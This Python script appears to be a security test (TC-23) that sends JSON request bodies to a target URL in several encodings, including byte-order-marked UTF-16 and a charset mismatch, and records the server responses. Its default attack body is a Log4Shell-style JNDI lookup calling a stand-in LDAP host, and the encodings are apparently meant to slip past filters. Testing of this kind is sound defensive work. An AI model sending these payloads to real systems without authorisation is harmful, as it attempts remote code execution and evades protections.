#!/usr/bin/env python3
from __future__ import annotations

import argparse
from pathlib import Path

from http_probe_common import curl_request, dump_json, ensure_dir, write_csv


def write_bytes(path: Path, data: bytes) -> None:
    path.write_bytes(data)


def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-23 charset, BOM, and UTF-16 parsing probes.")
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--method", default="POST")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--safe-json", default='{"q":"safe"}')
    parser.add_argument("--attack-json", default='{"q":"${jndi:ldap://probe.invalid/tc23}"}')
    args = parser.parse_args()

    out_dir = ensure_dir(args.output_dir)
    safe_utf8 = args.safe_json.encode("utf-8")
    attack_utf8 = args.attack_json.encode("utf-8")
    attack_utf8_bom = b"\xef\xbb\xbf" + attack_utf8
    attack_utf16le_bom = b"\xff\xfe" + args.attack_json.encode("utf-16le")
    attack_utf16be_bom = b"\xfe\xff" + args.attack_json.encode("utf-16be")

    cases = [
        ("baseline_safe_utf8", safe_utf8, "application/json; charset=utf-8"),
        ("attack_utf8", attack_utf8, "application/json; charset=utf-8"),
        ("attack_utf8_bom", attack_utf8_bom, "application/json; charset=utf-8"),
        ("attack_utf16le_bom", attack_utf16le_bom, "application/json; charset=utf-16le"),
        ("attack_utf16be_bom", attack_utf16be_bom, "application/json; charset=utf-16be"),
        ("attack_utf16le_mismatch", attack_utf16le_bom, "application/json; charset=utf-8"),
    ]

    rows: list[dict[str, str]] = []
    summary = {"url": args.url, "cases": []}
    for name, body_bytes, content_type in cases:
        body_path = out_dir / f"{name}.payload.bin"
        write_bytes(body_path, body_bytes)
        result = curl_request(
            url=args.url,
            out_prefix=out_dir / name,
            method=args.method,
            headers=[f"Content-Type: {content_type}"],
            body_path=body_path,
            timeout=args.timeout,
        )
        metadata = {
            "case": name,
            "content_type": content_type,
            "body_size": len(body_bytes),
            "has_bom": name.endswith("_bom") or "mismatch" in name,
            "result": result,
        }
        dump_json(out_dir / f"{name}.meta.json", metadata)
        summary["cases"].append(metadata)
        rows.append(
            {
                "case": name,
                "content_type": content_type,
                "body_size": str(len(body_bytes)),
                "http_code": result["http_code"],
                "server_header": result["server_header"],
                "content_type_response": result["content_type"],
                "body_fingerprint": result["body_fingerprint"],
                "header_path": result["header_path"],
                "body_path": result["body_path"],
                "payload_path": str(body_path),
            }
        )

    dump_json(out_dir / "summary.json", summary)
    write_csv(
        out_dir / "summary.csv",
        [
            "case",
            "content_type",
            "body_size",
            "http_code",
            "server_header",
            "content_type_response",
            "body_fingerprint",
            "header_path",
            "body_path",
            "payload_path",
        ],
        rows,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
